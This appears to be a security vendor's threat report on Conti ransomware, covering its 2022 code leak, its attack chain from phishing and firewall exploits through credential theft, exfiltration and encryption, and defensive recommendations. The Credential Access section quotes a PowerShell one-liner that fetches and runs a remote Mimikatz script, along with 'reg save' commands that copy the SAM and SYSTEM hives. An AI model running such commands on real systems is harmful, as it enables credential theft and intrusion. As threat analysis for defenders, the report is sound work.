What do you need to know about Conti ransomware to help secure your organization?
Assumed to be the successor of the Ryuk ransomware, Conti is currently one of the most notorious active ransomware families, and is used as
a ransomware-as-a-service (RaaS) in high-profile attacks such as those launched against healthcare institutions in Ireland and New Zealand.
Conti operators also leverage double extortion techniques, and have resorted to not just publishing stolen data, but also selling access to
victim organizations that refused to pay the ransom.
Armed with other stealthy techniques such as BazarLoader and other tricks up its sleeves, the Conti ransomware family has the tenth-most
attack attempts detected in the first half of the year, as reported in the Trend Micro 2021 Midyear Cybersecurity Report.
On March 2, 2022, a Ukrainian researcher reportedly leaked some of the ransomware group’s files. Although the Conti group mostly uses
open-source tools, this leak included important components, such as the code for the administrator panel, Conti Locker v2, and a decryptor.
This code dump could potentially have a significant impact on the RaaS landscape. While on the cybersecurity side, researchers will be able to
use this to gain further insight into Conti’s operations, the leak could also serve as a start-up kit for groups who may not have otherwise had
the means to create their own RaaS operation. This development might end up being similar to the change seen in the internet-of-things (IoT)
and Linux malware space when Mirai source code was leaked, where its code immediately become the new baseline for malicious actors,
effectively raising the overall base sophistication of the IoT cybercrime landscape.
As one of the most prolific and capable groups operating today, we would like to emphasize that the leak does not signal that Conti is in any
way under pressure and at risk of shutting down — rather, we believe that it will force the ransomware gang to improve their capabilities and
security to stay ahead of competitor groups who can use their leaked code to catch up. In addition, while the gang continues to operate as
normal, we would expect new groups to emerge using the same tools, tactics, and procedures.
This article details the Conti ransomware to help incident responders and security teams spot attacks easier.

Infection chain and techniques

Figure 3. Conti infection chain

Initial Access
Conti can arrive in the system through BazarLoader, which is delivered via phishing emails containing a Google Drive link that downloads
the malware.
Alternatively, the ransomware can arrive via exploiting the the FortiGate firewall vulnerabilities CVE-2018-13379 and CVE-2018-13374.
After successfully exploiting the application, the ransomware deploys Cobalt Strike to gain a foothold on the system.
Conti can also arrive as a result of the exploitation of the ProxyShell Microsoft Exchange vulnerabilities.

Discovery
For initial reconnaissance, the Conti group uses tools such as Whoami, Nltest, and Net. These tools give the operators information about
where they are in the system, and what rights and permissions they have.
Since the operators employ double extortion tactics, they actively look for files to exfiltrate in the discovery stage. The threat actors use
tools such as ShareFinder to identify the shares needed for exfiltration and ransomware deployment.

Privilege Escalation
3/7

Although the group mostly relies on finding the domain admin credentials to gain full access to the domain, they may also use a couple of
exploits like Zerologon (CVE-2020-1472) and PrintNightmare (CVE-2021-1675), to elevate their privilege and further strengthen their
foothold in the network.

Credential Access
The attackers dump cached credentials on systems to allow them to move laterally or elevate their privilege. They use tools such as
ProcDump to dump system process/es (usually lssas.exe) and use it in combination with Mimikatz to dump credentials.
In other cases, they may use mass-mimikatz, a module from Empire, to dump the credentials on multiple systems.
Mimikatz (mass-mimikatz, from Empire)
C:\WINDOWS\SYSTEM32\WBEM\WMIC.exe /node:localhost process call create powershell /c IEX
(NewObjectNet.WebClient).DownloadString('https://raw.githubusercontent[.]com/PowerShellEmpire/PowerTools/master/PewPewPew/In
MassMimikatz.ps1');'24346D,COMPUTERNAME2'|Invoke-MassMimikatz -Verbose > c:/programdata/2.txt
Alternatively, they may also use the kerberoasting module of the PowerShell empire or use tools like Rubeus.
The attackers may also use native Windows tools, such as Task Manager, to dump the memory of lsass or use the comsvcs DLL file’s
MiniDump function.
They also gain access to the credentials by taking them out of password stores.
One of the ways to do this is through “reg save” commands.
- reg save HKLM\SAM C:\programdata\SamBkup.hiv
- reg save HKLM\SYSTEM C:\programdata\FileName.hiv
They can also use tools such as Get-GPPPassword to get plain text passwords stored in the group policy preference
They can also gain credentials from browsers and cloud applications using tools such as SharpChrome and SeatBelt.
After gaining enough credentials, they use SMBAutoBrute to automate the task of bruteforcing the passwords and see what password
works.
After gaining information on the domain accounts, the attackers then dump the domain controller credentials using Ntdsutil.
Alternatively, they can also use Vssadmin to create a snapshot of the system and download Ntds.dit to accomplish this.

Lateral Movement
The attackers can also use batch files to disable security tools. These files are executed through scheduled tasks.
The groups are also known to use third-party tools such as Atera and AnyDesk to control remote systems.
The operators are also known to use EternalBlue to move laterally in the network of systems that are vulnerable to this exploit.
They also use PSExec to remotely execute scripts and the ransomware itself.

Defense Evasion
Just before the execution of the ransomware, threat actors create a series of batch files to automate the distribution of its tools in the
domain. These tools include scripts to terminate existing security software.
The operators can also use other tools, like GMER, PC Hunter, and PowerShell, to accomplish this.

Execution
Ties to the Trickbot gang gave Conti operators the ability to execute the ransomware via BazarLoader, which leads to Cobalt Strike,
which eventually leads to the ransomware itself.
Once the actors are inside the network, they tend to use scheduled tasks and batch files as a means of execution on remote systems.
Alternatively, to execute the ransomware the operators can use files such as the DontSleep.exe process, which calls the task manager
where the file can be executed.

Exfiltration
The attackers perform data exfiltration on the system with the use of the Rclone tool, which is an open-source tool used for syncing files
to a specified cloud storage, such as Mega cloud storage.
The group can also use WinSCP to exfiltrate data.

Impact

4/7

After exfiltration and distribution of the ransomware to the targeted endpoints, the files are now encrypted using ChaCha20 with
RSA4096 to protect the ChaCha key and nonce.
The ransomware also inhibits system recovery by deleting shadow copies using WMI.

Recommendations
To help defend systems against similar threats, organizations can establish security frameworks, which can allocate resources systematically
for establishing a solid defense against ransomware.
Here are some best practices that can be included in these frameworks:

Audit and inventory
Take an inventory of assets and data
Identify authorized and unauthorized devices and software
Make an audit of event and incident logs

6/7

Configure and monitor
Manage hardware and software configurations
Grant admin privileges and access only when necessary to an employee’s role
Monitor network ports, protocols, and services
Activate security configurations on network infrastructure devices such as firewalls and routers
Establish a software allow list that only executes legitimate applications

Patch and update
Conduct regular vulnerability assessments
Perform patching or virtual patching for operating systems and applications
Update software and applications to their latest versions

Protect and recover
Implement data protection, backup, and recovery measures
Enable multifactor authentication

Secure and defend
Employ sandbox analysis for blocking malicious emails
Deploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network
